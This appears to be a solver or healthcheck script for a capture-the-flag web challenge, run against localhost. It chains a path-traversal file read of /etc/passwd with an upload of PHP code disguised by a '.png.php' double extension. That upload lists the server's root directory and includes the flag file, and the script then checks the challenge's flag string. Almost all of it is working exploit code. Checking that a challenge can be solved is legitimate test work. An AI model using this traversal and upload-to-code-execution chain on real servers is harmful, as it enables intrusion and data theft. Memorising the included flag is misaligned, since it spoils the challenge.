#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re
import requests
import uuid


def basic():
      r = requests.get('http://localhost')

      return r.status_code == 200 and "Conf1gurex" in r.text


def lfi():
      r = requests.get('http://localhost/get.php?file=....//....//....//....//etc/passwd')
      if r.status_code != 200 or "root" not in r.text:
            print("LFI failed")
            return False

      return True


def upload_malicious_file(content):
      filename = str(uuid.uuid4())

      files = {f"file": (f'{filename}.png.php', content)}
      data = {
            "email": "test@test.com",
            "message": "test"
      }
      r = requests.post('http://localhost/contact.php', files=files, data=data)

      if r.status_code != 200 or "Success" not in r.text:
            print("Failed to upload file")
            return False
      return filename


def get_file(filename):
      r = requests.get(f'http://localhost/uploads/{filename}.png.php/index.php')
      if r.status_code != 200:
            print("Failed to get file")
            return False
      return r.text


def exploit():
      # Upload file to ls /
      filename = upload_malicious_file('<?php print_r (scandir("/")) ?>')
      if not filename:
            return False

      # Get output
      output = get_file(filename)
      if not output:
            return False

      # Grab uuid from output
      flag_dir = re.search(r'([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})', output)[0]
      if not flag_dir:
            print("Failed to extract folder with the flag")
            return False

      # Upload file to get flag
      filename = upload_malicious_file(f'<?php include("/{flag_dir}/flag") ?>')

      # Get output
      flag = get_file(filename)
      if not flag:
            return False

      if flag == "BtSCTF{y0ur_c0nf1gur4t10n_n33ds_f1x1ng}":
            print(flag)
            return True

      return False


if basic() and lfi() and exploit():
      exit(0)

exit(1)
